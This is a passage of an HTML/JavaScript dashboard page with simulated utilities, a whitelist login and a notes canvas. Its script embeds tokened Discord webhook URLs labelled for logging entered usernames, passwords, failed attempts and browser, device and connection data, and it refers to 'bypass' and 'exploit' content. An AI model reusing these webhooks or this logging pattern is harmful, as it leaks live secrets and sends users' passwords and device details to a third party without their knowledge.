              <button id="createFileBtn" data-action="Create Simulated File">New File</button>
              <button id="deleteSelectedBtn" data-action="Delete Selected Item">Delete</button>
          </div>
          <div id="fileContentDisplay" class="info-text" style="margin-top: 15px; display: none;">
              <h3>File Content: <span id="currentOpenedFile"></span></h3>
              <textarea id="fileTextContent" rows="8" style="width: 100%; margin-top: 10px; background: #0d1a25; color: #fff; border-color: #555;"></textarea>
              <button id="saveFileContentBtn" data-action="Save File Content">Save Content</button>
          </div>
          <div class="info-text" style="margin-top: 15px;">
              <p><em>This is a mock file system for illustrative purposes. No actual files are created or modified on your device.</em></p>
          </div>
      </div>

      <!-- Daily Tasks & Goals Panel - NEW -->
      <div id="tasksPanel" class="info-panel">
          <h2>✅ Daily Tasks & Goals</h2>
          <p>Organize your day, track progress, and complete your tasks effectively.</p>
          <div style="display: flex; gap: 10px; margin-bottom: 15px;">
              <input type="text" id="newTaskInput" placeholder="Add a new task..." style="flex-grow: 1; margin-bottom: 0;">
              <button id="addTaskBtn" data-action="Add Task">Add Task</button>
          </div>
          <div class="task-filter">
              <button data-filter="all" class="active" data-action="Filter All Tasks">All</button>
              <button data-filter="active" data-action="Filter Active Tasks">Active</button>
              <button data-filter="completed" data-action="Filter Completed Tasks">Completed</button>
          </div>
          <ul id="tasksList">
              <!-- Tasks will be loaded here -->
          </ul>
      </div>

      <!-- System Diagnostics Panel - NEW -->
      <div id="diagnosticsPanel" class="info-panel">
          <h2>🩺 System Diagnostics</h2>
          <p>Run simulated diagnostic checks on your system to ensure optimal performance and security. All results are simulated.</p>
          <button id="runDiagnosticsBtn" data-action="Run System Diagnostics">Run All Diagnostics</button>
          <div class="progress-bar-container" style="margin-top: 15px; display: none;">
              <div class="progress-bar" id="diagProgressBar"></div>
          </div>
          <div id="diagnosticOutput" class="diag-output" style="margin-top: 20px;">
              <p>Awaiting diagnostic command...</p>
          </div>
          <div class="info-text" style="margin-top: 15px;">
              <p><em>Note: These diagnostics are purely simulated and do not interact with your actual computer hardware or software.</em></p>
          </div>
      </div>

      <!-- Password Generator Panel - NEW -->
      <div id="passGenPanel" class="info-panel">
          <h2>🔑 Secure Password Generator</h2>
          <p>Generate strong, unique passwords with custom criteria for enhanced online security.</p>
          <div class="password-output" id="generatedPassword">Click "Generate Password"</div>
          <div class="pass-controls" style="margin-top: 20px;">
              <label for="passwordLength">Password Length: <span id="passLengthValue">12</span></label>
              <input type="range" id="passwordLength" min="8" max="64" value="12">
              <label>
                  <input type="checkbox" id="includeUppercase" checked> Include Uppercase (A-Z)
              </label><br>
              <label>
                  <input type="checkbox" id="includeLowercase" checked> Include Lowercase (a-z)
              </label><br>
              <label>
                  <input type="checkbox" id="includeNumbers" checked> Include Numbers (0-9)
              </label><br>
              <label>
                  <input type="checkbox" id="includeSymbols"> Include Symbols (!@#$%^&*)
              </label>
              <button id="generatePassBtn" style="margin-top: 15px; width: 100%;" data-action="Generate New Password">Generate Password</button>
          </div>
      </div>

      <!-- Network Scanner Panel - NEW -->
      <div id="networkScannerPanel" class="info-panel">
          <h2>🔍 Network Scanner (Simulated)</h2>
          <p>Simulate a local network scan to identify connected devices and network details. This is for demonstration only.</p>
          <button id="startScanBtn" data-action="Start Network Scan">Start Scan</button>
          <div id="networkScanOutput" class="scanner-display" style="margin-top: 20px;">
              <p>Ready to scan local network (simulated)...</p>
          </div>
          <div class="info-text" style="margin-top: 15px;">
              <p><em>Warning: This is a simulated tool. It does not perform actual network scans. For real-world use, consult IT policies.</em></p>
          </div>
      </div>

      <!-- Encrypt/Decrypt Text Tool - NEW -->
      <div id="encryptDecryptPanel" class="info-panel">
          <h2>🔒 Encrypt/Decrypt Text Tool</h2>
          <p>Securely "encrypt" and "decrypt" messages using a simple substitution cipher. Keep sensitive notes confidential.</p>
          <textarea id="encryptInput" placeholder="Enter text to encrypt/decrypt..."></textarea>
          <div class="cipher-key">
              <label for="cipherKey">Cipher Key:</label>
              <input type="password" id="cipherKey" placeholder="Enter a key for encryption" autocomplete="off">
          </div>
          <div class="cipher-actions">
              <button id="encryptTextBtn" data-action="Encrypt Text">Encrypt Text</button>
              <button id="decryptTextBtn" data-action="Decrypt Text">Decrypt Text</button>
          </div>
          <textarea id="encryptOutput" placeholder="Result will appear here..." readonly style="margin-top: 15px;"></textarea>
          <div class="info-text" style="margin-top: 15px;">
              <p><em>Note: This uses a basic substitution cipher and is not suitable for high-security applications. Key must match for encrypt/decrypt.</em></p>
          </div>
      </div>

      <!-- Code Editor Sandbox - NEW -->
      <div id="codeEditorPanel" class="info-panel">
          <h2>🧑‍💻 Code Editor (Sandbox)</h2>
          <p>A simple text editor designed for writing and storing code snippets. Useful for quick drafting or testing logic locally.</p>
          <div class="code-editor-wrapper">
            <div class="code-toolbar">
                <input type="text" id="codeSnippetName" placeholder="Snippet name..." style="width: 150px; margin-bottom: 0;">
                <button id="newSnippetBtn" data-action="New Code Snippet">New</button>
                <button id="saveSnippetBtn" data-action="Save Code Snippet">Save</button>
                <button id="deleteSnippetBtn" data-action="Delete Code Snippet">Delete</button>
            </div>
            <textarea id="codeEditorInput" class="code-input" placeholder="Start coding here... (e.g., HTML, CSS, JavaScript)"></textarea>
          </div>
          <div class="info-text" style="margin-top: 15px;">
            <h3>Saved Snippets:</h3>
            <div id="codeSnippetList" class="file-list">
                <!-- Code snippets will load here -->
            </div>
          </div>
          <div class="info-text" style="margin-top: 15px;">
            <p><em>This is a local sandbox; code is not executed, merely stored as text for personal reference.</em></p>
          </div>
      </div>

    </div> <!-- End infoPanelsContainer -->

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn" data-action="Clear Notes Canvas">Clear Canvas</button>
        <button id="closeCanvasBtn" data-action="Close Notes Canvas">Close Notes</button>
      </div>
    </div>
  </div>

  <!-- Global System Notification Container - NEW -->
  <div id="systemNotifications"></div>

  <script>
    // System Utilities and Globals
    const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

    // Discord Webhooks for comprehensive logging (unchanged as per instruction)
    const loggingWebhooks = {
      username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
      password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFHHE_9E1r-N7Jp6g0N234z0yI',
      identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf0Oj7Ce9c02cA',
      invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
      invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
      invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
      attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWH3Gs39lC6YRZ_1aw',
      attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHqIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
    };

    const webhookUrls = {
      userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
      browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
      deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
      connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
      sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
    };
    
    // NEW: System-wide Notification Function
    const notify = (message, type = 'info', duration = 3000) => {
        const notificationsContainer = document.getElementById('systemNotifications');
        const notification = document.createElement('div');
        notification.classList.add('notification-item', type);
        notification.innerHTML = `
            <span>${message}</span>
            <button class="close-btn">&times;</button>
        `;

        notificationsContainer.prepend(notification); // Add to top

        setTimeout(() => {
            notification.classList.add('show');
        }, 10); // Small delay to trigger CSS transition

        const timer = setTimeout(() => {
            notification.classList.remove('show');
            notification.addEventListener('transitionend', () => notification.remove(), { once: true });
        }, duration);

        notification.querySelector('.close-btn').addEventListener('click', () => {
            clearTimeout(timer); // Prevent auto-close if manually closed
            notification.classList.remove('show');
            notification.addEventListener('transitionend', () => notification.remove(), { once: true });
        });
    };

    // Global event listener for button clicks to trigger notifications - NEW
    document.addEventListener('click', (event) => {
        // Find the nearest ancestor with a data-action attribute
        const button = event.target.closest('button, a');
        if (button && button.dataset.action) {
            let actionText = button.dataset.action;
            if (actionText.includes("Toggle Panel") || actionText.includes("Open")) {
                // If it's a panel toggle/open action, make notification specific
                const panelId = button.onclick ? button.onclick.toString().match(/'([^']+)'/) : null;
                const panelName = panelId ? document.getElementById(panelId[1]).querySelector('h2').textContent.replace('Panel', '').trim() : null;
                if(panelName) {
                    notify(`Opening ${panelName.replace('Information', 'Info')}.`, 'success');
                } else {
                    notify(`${actionText} triggered.`, 'info');
                }
            } else if (actionText.includes("Apply User Settings")) {
                // Settings applied is special for consistency
            }
            else {
                 notify(`${actionText} triggered.`, 'info');
            }
        }
    });

    // NEW: Initial Loading Animation Sequence
    const initialLoader = document.getElementById('initialLoader');
    const loaderBox = document.getElementById('loaderBox');
    const loaderMessage = document.getElementById('loaderMessage');

    const loadingMessages = [
        "Initializing System...",
        "Accessing Key System...",
        "Loading Dashboard...",
        "Authentication Required. Redirecting to Login."
    ];
    let messageIndex = 0;

    function typeMessage(message, callback) {
        loaderMessage.textContent = ''; // Clear previous message
        loaderMessage.classList.remove('typing'); // Reset animation
        void loaderMessage.offsetWidth; // Trigger reflow
        loaderMessage.classList.add('typing');

        let i = 0;
        const speed = 70; // Typing speed

        function type() {
            if (i < message.length) {
                loaderMessage.textContent += message.charAt(i);
                i++;
                setTimeout(type, speed);
            } else {
                setTimeout(callback, 1500); // Pause after typing
            }
        }
        type();
    }

    function startLoadingSequence() {
        if (messageIndex < loadingMessages.length) {
            typeMessage(loadingMessages[messageIndex], () => {
                messageIndex++;
                startLoadingSequence();
            });
        } else {
            // All messages displayed, fade out loader and show login
            initialLoader.classList.add('hidden');
            initialLoader.addEventListener('transitionend', () => {
                initialLoader.remove();
                document.getElementById('loginBox').style.display = 'block';
                document.body.style.overflow = 'auto'; // Re-enable scrolling if needed
            }, { once: true });
        }
    }

    // Start the loading sequence when the page fully loads
    document.addEventListener('DOMContentLoaded', () => {
        // Wait a little before starting, giving initial CSS animations time to settle
        setTimeout(startLoadingSequence, 500);
    });

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        // New Module Initializations - NEW
        this.initReminders();
        this.initSettings();
        this.initMessaging();
        this.initFileManager();
        this.initTasks();
        this.initDiagnostics();
        this.initPasswordGenerator();
        this.initNetworkScanner();
        this.initEncryptDecrypt();
        this.initCodeEditor();

        // Animate boxes sliding in - NEW
        document.querySelectorAll('.main-row .box, #updatesNotifications .box').forEach(box => {
            box.style.opacity = '1';
            box.style.transform = 'translateY(0)';
        });
        
        // Initial dashboard loaded notification
        notify("Dashboard loaded successfully! Welcome.", 'success', 4000);
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        // Added day headers - NEW
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.classList.add('day-header'); // Style headers differently
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        // Load saved theme preference - NEW
        const savedTheme = localStorage.getItem('dashboardTheme');
        if (savedTheme === 'light') {
            document.body.classList.add('light-theme');
            themeBtn.innerText = '☀️ Light Mode';
        } else {
            themeBtn.innerText = '🌙 Dark Mode';
        }

        themeBtn.addEventListener('click', () => {
          document.body.classList.toggle('light-theme');
          if(document.body.classList.contains('light-theme')){
            themeBtn.innerText = '☀️ Light Mode';
            localStorage.setItem('dashboardTheme', 'light'); // Save preference
            notify("Switched to Light Mode.", 'info');
          } else {
            themeBtn.innerText = '🌙 Dark Mode';
            localStorage.setItem('dashboardTheme', 'dark'); // Save preference
            notify("Switched to Dark Mode.", 'info');
          }
          dashboard.applyCustomSettings(); // Re-apply custom settings if theme changes
        });
      },
      
      // Initialize buttons
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          notify("Panic button activated. Redirecting to safe site.", 'warning');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            notify("Application Restart initiated. Page killed.", 'warning');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          notify('Running quick diagnostics... No issues found. System is stable!', 'success');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              notify(`Error: Could not enable full-screen: ${err.message}`, 'error');
            });
            notify("Entered Full Screen mode.", 'info');
          } else {
            document.exitFullscreen();
            notify("Exited Full Screen mode.", 'info');
          }
        });
        
        let zoomLevel = parseFloat(localStorage.getItem('dashboardZoom') || 1); // Load saved zoom
        document.body.style.zoom = zoomLevel; // Apply on load

        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            localStorage.setItem('dashboardZoom', zoomLevel); // Save zoom level
            notify(`Zoomed In. Current level: ${Math.round(zoomLevel * 100)}%`, 'info');
          } else {
            notify(`Max zoom level reached (${Math.round(maxZoom * 100)}%).`, 'warning');
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            localStorage.setItem('dashboardZoom', zoomLevel); // Save zoom level
            notify(`Zoomed Out. Current level: ${Math.round(zoomLevel * 100)}%`, 'info');
          } else {
            notify(`Min zoom level reached (${Math.round(minZoom * 100)}%).`, 'warning');
          }
        });

        // Logout Button - NEW
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out? Your session will end.')) {
                // Perform any logout logging here if necessary
                window.location.reload(); // Simple reload to go back to login screen
            }
        });
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // This refers to the main boxes: calendar and motivation.
        const updatesNotifications = document.getElementById('updatesNotifications'); // This refers to the updates and notifications boxes.
        const quickBars = document.querySelectorAll('.quick-bar, .system-controls'); // All button groups

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none'; // Hide updates/notifications too
          quickBars.forEach(bar => bar.style.display = 'none'); // Hide all button bars
          document.getElementById('infoPanelsContainer').style.display = 'none'; // Hide info panels

          canvasContainer.style.display = 'block';
          setTimeout(() => canvasContainer.classList.add('active'), 10); // Trigger animation
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.classList.remove('active');
          canvasContainer.addEventListener('transitionend', () => {
              canvasContainer.style.display = 'none';
              mainGrid.style.display = 'flex';
              updatesNotifications.style.display = 'flex'; // Show updates/notifications
              quickBars.forEach(bar => bar.style.display = 'flex'); // Show all button bars
              document.getElementById('infoPanelsContainer').style.display = 'block'; // Show info panels
          }, { once: true });
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Load saved canvas image if available - NEW
        const savedCanvas = localStorage.getItem('notesCanvasImage');
        if (savedCanvas) {
            const img = new Image();
            img.onload = () => {
                ctx.drawImage(img, 0, 0);
            };
            img.src = savedCanvas;
        } else {
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
            y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top
          };
        }

        const saveCanvasState = () => {
            localStorage.setItem('notesCanvasImage', canvas.toDataURL());
        };

        ['mousedown', 'touchstart'].forEach(evtName => {
            canvas.addEventListener(evtName, (e) => {
                drawing = true;
                const pos = getPos(e);
                ctx.beginPath();
                ctx.moveTo(pos.x, pos.y);
                e.preventDefault();
            });
        });

        ['mousemove', 'touchmove'].forEach(evtName => {
            canvas.addEventListener(evtName, (e) => {
                if (!drawing) return;
                const pos = getPos(e);
                ctx.lineTo(pos.x, pos.y);
                ctx.strokeStyle = '#ff914d'; // Use existing theme color
                ctx.lineWidth = 2;
                ctx.lineCap = 'round';
                ctx.stroke();
                e.preventDefault();
            });
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
            saveCanvasState(); // Save after drawing stops - NEW
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          saveCanvasState(); // Clear saved state too
          notify("Notes canvas cleared.", 'info');
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body; 
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            notify("Screenshot saved as 'dashboard_screenshot.png'.", 'success');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          notify("Notes canvas exported as 'notes_canvas.png'.", 'success');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          // Instead of direct display manipulation, we now hide/show a wrapper - NEW
          const mainContentContainers = [mainGrid, updatesNotifications]; // All content outside info panels and canvas

          const isMainContentVisible = mainGrid.style.display !== 'none';
          
          if (isMainContentVisible) {
              mainContentContainers.forEach(container => container.style.display = 'none');
              toggleBtn.innerText = '⬇️ Show Sections';
              notify("Main sections collapsed.", 'info');
          } else {
              mainContentContainers.forEach(container => container.style.display = 'flex');
              toggleBtn.innerText = '⬆️ Hide Sections';
              notify("Main sections expanded.", 'info');
          }
        });
      },
      
      // Initialize panels (new transition logic) - MODIFIED
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none'; // Ensure all panels are hidden by default
          panel.classList.remove('active'); // Remove active state on init
        });
        document.querySelectorAll('.ipad-content, .bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },
      
      // Panel toggle functions (new animation classes) - MODIFIED
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        // Hide all other panels first
        document.querySelectorAll('.info-panel.active').forEach(activePanel => {
            if (activePanel.id !== panelId) {
                activePanel.classList.remove('active');
                activePanel.addEventListener('transitionend', () => { activePanel.style.display = 'none'; }, { once: true });
            }
        });

        if (panel.classList.contains('active')) {
            // If already active, close it
            panel.classList.remove('active');
            panel.addEventListener('transitionend', () => { panel.style.display = 'none'; }, { once: true });
            notify(`Closed ${panel.querySelector('h2').textContent.trim()}`, 'info');
        } else {
            // Open the new panel
            panel.style.display = 'block'; // Make it visible for animation to apply
            setTimeout(() => { // Small timeout to allow display change before transition
                panel.classList.add('active');
            }, 10);
            notify(`Opened ${panel.querySelector('h2').textContent.trim()}`, 'success');
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        targetContent.style.display = 'block';
        notify(`Showing iPad ${contentId} information.`, 'info');
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        targetContent.style.display = 'block';
        notify(`Showing bypass content for ${contentId}.`, 'info');
      },

      // NEW: Reminder System Module
      initReminders: function() {
          const reminderForm = document.getElementById('reminderForm');
          const reminderText = document.getElementById('reminderText');
          const reminderDateTime = document.getElementById('reminderDateTime');
          const remindersList = document.getElementById('remindersList');

          let reminders = JSON.parse(localStorage.getItem('systemReminders')) || [];

          const saveReminders = () => {
              localStorage.setItem('systemReminders', JSON.stringify(reminders));
          };

          const renderReminders = () => {
              remindersList.innerHTML = '';
              const now = new Date();

              reminders.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime));

              reminders.forEach( (reminder, index) => {
                  const li = document.createElement('li');
                  li.classList.add('reminder-entry');
                  const reminderDate = new Date(reminder.dateTime);
                  
                  let statusText = `${reminderDate.toLocaleDateString()} ${reminderDate.toLocaleTimeString()}`;
                  
                  if (reminder.completed) {
                      li.classList.add('completed');
                      statusText += " (Completed)";
                  } else if (reminderDate < now) {
                      li.classList.add('overdue');
                      statusText += " (Overdue!)";
                  }

                  li.innerHTML = `
                      <input type="checkbox" ${reminder.completed ? 'checked' : ''} data-index="${index}" data-action="Toggle Reminder Completion">
                      <span class="reminder-text">${reminder.text}</span>
                      <span class="reminder-time">${statusText}</span>
                      <button data-index="${index}" class="delete-reminder" data-action="Delete Reminder">&times;</button>
                  `;
                  remindersList.appendChild(li);
              });
          };

          reminderForm.addEventListener('submit', (e) => {
              e.preventDefault();
              if (reminderText.value.trim() && reminderDateTime.value) {
                  const newReminder = {
                      id: Date.now(),
                      text: reminderText.value.trim(),
                      dateTime: reminderDateTime.value,
                      completed: false
                  };
                  reminders.push(newReminder);
                  saveReminders();
                  renderReminders();
                  reminderText.value = '';
                  reminderDateTime.value = '';
                  notify('Reminder added successfully!', 'success');
                  // Set actual JS reminder (optional, for real popups)
                  dashboard.scheduleReminder(newReminder);
              } else {
                notify('Please fill in both reminder text and date/time.', 'warning');
              }
          });

          remindersList.addEventListener('click', (e) => {
              const index = e.target.dataset.index;
              if (e.target.classList.contains('delete-reminder')) {
                  reminders.splice(index, 1);
                  saveReminders();
                  renderReminders();
                  notify('Reminder deleted.', 'info');
              } else if (e.target.type === 'checkbox') {
                  reminders[index].completed = e.target.checked;
                  saveReminders();
                  renderReminders();
                  notify(`Reminder "${reminders[index].text}" marked as ${e.target.checked ? 'completed' : 'active'}.`, 'info');
              }
          });

          renderReminders(); // Initial render
          // Set min date for datetime-local to now for future reminders - NEW
          reminderDateTime.min = new Date().toISOString().slice(0, 16);

          // Schedule initial reminders on load
          reminders.forEach(reminder => {
            if (!reminder.completed) {
              dashboard.scheduleReminder(reminder);
            }
          });
      },

      // Schedule individual reminder for alert - NEW
      scheduleReminder: function(reminder) {
          const reminderDate = new Date(reminder.dateTime);
          const now = new Date();
          if (reminderDate <= now || reminder.completed) return; // Don't schedule past or completed reminders

          const timeToReminder = reminderDate.getTime() - now.getTime();
          
          setTimeout(() => {
              if (document.getElementById('remindersPanel').classList.contains('active')) {
                // If panel open, just refresh display to show overdue
                dashboard.initReminders(); 
              } else {
                // Otherwise, show an actual alert
                notify(`🔔 Reminder: ${reminder.text} (due ${reminderDate.toLocaleTimeString()})`, 'warning', 10000);
              }
              // Mark as overdue in UI (without completing)
              // This is handled by renderReminders for dates past 'now'
          }, timeToReminder);
      },

      // NEW: User Settings Module
      initSettings: function() {
          const primaryColorInput = document.getElementById('themeColorPrimary');
          const secondaryColorInput = document.getElementById('themeColorSecondary');
          const baseFontSizeInput = document.getElementById('baseFontSize');
          const baseFontSizeDisplay = document.getElementById('baseFontSizeDisplay');
          const dashboardFontSelect = document.getElementById('dashboardFont');
          const applySettingsBtn = document.getElementById('applySettingsBtn');
          const root = document.documentElement; // For CSS variables

          // Load saved settings
          const savedSettings = JSON.parse(localStorage.getItem('dashboardSettings')) || {};

          primaryColorInput.value = savedSettings.primaryColor || getComputedStyle(root).getPropertyValue('--dark-primary-accent');
          secondaryColorInput.value = savedSettings.secondaryColor || getComputedStyle(root).getPropertyValue('--dark-secondary-accent');
          baseFontSizeInput.value = savedSettings.baseFontSize || 14;
          dashboardFontSelect.value = savedSettings.fontFamily || "'Montserrat', sans-serif";

          // Update display immediately on load
          baseFontSizeDisplay.textContent = `${baseFontSizeInput.value}px`;
          dashboard.applyCustomSettings();


          baseFontSizeInput.addEventListener('input', () => {
              baseFontSizeDisplay.textContent = `${baseFontSizeInput.value}px`;
          });

          applySettingsBtn.addEventListener('click', () => {
              const settings = {
                  primaryColor: primaryColorInput.value,
                  secondaryColor: secondaryColorInput.value,
                  baseFontSize: baseFontSizeInput.value,
                  fontFamily: dashboardFontSelect.value,
              };
              localStorage.setItem('dashboardSettings', JSON.stringify(settings));
              dashboard.applyCustomSettings(settings);
              notify('Custom settings applied successfully!', 'success');
          });
      },

      applyCustomSettings: function(settings = null) {
        const root = document.documentElement;
        if (!settings) {
            settings = JSON.parse(localStorage.getItem('dashboardSettings')) || {};
        }

        // Apply primary/secondary colors
        root.style.setProperty('--dark-primary-accent', settings.primaryColor || '#ff914d');
        root.style.setProperty('--dark-secondary-accent', settings.secondaryColor || '#ffb67a');
        
        // Ensure buttons get updated colors
        document.querySelectorAll('.quick-bar button, .system-controls button, #canvasControls button').forEach(button => {
            if (!button.id.includes('panicBtn') && !button.id.includes('themeToggle') && !button.parentElement.classList.contains('system-controls')) { // Exclude system-controls for distinct color
                button.style.backgroundColor = settings.primaryColor || '#ff914d';
            }
        });
        document.querySelectorAll('.system-controls button').forEach(button => {
            // Apply only if the original 'system-controls' background is to be overridden by accent, otherwise keep it distinct
            // For now, let's keep it distinct as in CSS unless a new 'system-controls-accent' is introduced.
            // Example if we wanted to dynamically change system controls color based on primary accent
            // button.style.backgroundColor = `color-mix(in srgb, ${settings.primaryColor || '#6a1b9a'} 80%, black 20%)`; 
            // button.style.borderColor = `color-mix(in srgb, ${settings.primaryColor || '#9c27b0'} 80%, black 20%)`;
        });
        document.querySelectorAll('.links-list a, .handbook-buttons a, .exploit-buttons a').forEach(a => {
            a.style.backgroundColor = settings.primaryColor || '#ff914d';
        });

        // Apply font size and family
        document.body.style.fontSize = `${settings.baseFontSize || 14}px`;
        document.body.style.fontFamily = settings.fontFamily || "'Montserrat', sans-serif";

        // Calendar `today` button's dynamic styling
        const todayButton = document.querySelector('.calendar .today');
        if(todayButton) {
            todayButton.style.backgroundColor = settings.primaryColor || '#ff914d';
